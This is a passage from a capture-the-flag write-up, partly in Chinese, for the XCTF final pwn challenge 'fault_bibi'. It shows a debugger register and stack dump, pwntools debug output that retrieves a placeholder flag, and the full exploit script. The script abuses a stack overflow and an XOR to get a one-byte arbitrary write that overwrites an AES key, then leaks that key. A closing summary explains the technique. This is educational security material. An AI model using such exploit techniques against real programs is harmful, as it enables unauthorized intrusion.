    $r12   : 0x0               
    $r13   : 0x00007ffdd2d2d200  →  0x0000000000000001
    $r14   : 0x0               
    $r15   : 0x0               
    $eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
    $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
    ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
    0x00007ffdd2d2d050│+0x0000: 0x63b5b45642fb9bcd     ← $rdx, $rsp, $rdi
    0x00007ffdd2d2d058│+0x0008: 0xb2dc1a7edbfbedc1
    0x00007ffdd2d2d060│+0x0010: 0x00083620d2d2d220     ← $rbx
    0x00007ffdd2d2d068│+0x0018: 0x000055d955927da0  →  0xf8dfe8ebca9696bf
    0x00007ffdd2d2d070│+0x0020: 0x000055d9552653e0  →  0x309596f547c8c6fc
    0x00007ffdd2d2d078│+0x0028: 0x000055d9552653d0  →  0xf876b7f7f876b7f7
    0x00007ffdd2d2d080│+0x0030: 0x080404fdd2d2d0b0
    0x00007ffdd2d2d088│+0x0038: 0x000000000000000f
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
       0x55d955062fea                  mov    rdx, QWORD PTR [rbp-0x20]
       0x55d955062fee                  cdqe   
       0x55d955062ff0                  movzx  eax, BYTE PTR [rdx+rax*1] '
    [*] aa6da6ca395fcab1ceda405ca27a0956
    [DEBUG] Sent 0x2 bytes:
        's\n'
    [DEBUG] Sent 0x22 bytes:
        'aa6da6ca395fcab1ceda405ca27a0956\n'
        '\n'
    [*] Process './fault_bibi' stopped with exit code 0 (pid 106809)
    [DEBUG] Received 0x16 bytes:
        'flag{1111111111111111}'
    [*] flag{1111111111111111}
    [*] Switching to interactive mode
    [*] Got EOF while reading in interactive
## exp
    from pwn import *
    context.arch='amd64'
    context.terminal = ['terminator','-x','sh','-c']
    context.log_level = 'debug'
    def cmd(command):
        p.recvuntil(">",timeout=0.5)
        p.sendline(command)
    def main():
        global p
        #p = remote(host,port)
        p = process("./fault_bibi")
            # debug(0x0000000000003004)
        cmd('e')
        #gdb.attach(p)
        p.sendline("cafebabedeadbeefcafebabedeadbeef".decode('hex'))
        cmd('d')
        payload1 = "5658a9ced4f5415d3e85e2e879d464405658a9ced4f5415d3e85e2e879d46440"
        payload2 = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
        p.sendline(payload1)
        p.sendline(payload2)
        #gdb.attach(p)
        cmd('e')
        p.sendline("cafebabedeadbeefcafebabedeadbeef".decode('hex'))
        p.recvuntil("e:encryp",drop=True)
        p.recvuntil(">")
        key = p.recvuntil("e:encryp",drop=True)
        info(key)
        cmd('s')
        p.sendline(key)
        flag = p.recv(timeout=0.5)
        info(flag)
        p.interactive()
    if __name__ == "__main__":
        main()
## 总结
这道题目让我深刻的了解了AES加密算法的原理和c语言实现，题目巧妙地用一个栈溢出和一个亦或操作实现了一个字节的任意写，从而改变了bss段randkey的值，且在给定的参数为0条件下，亦或不影响正常的AES算法的值，当给定的参数非0，在不超过下标范围（0-0x10）内会影响AES结果，但超过下标范围会造成一个字节任意写。不愧是xctf
final题目，学到了！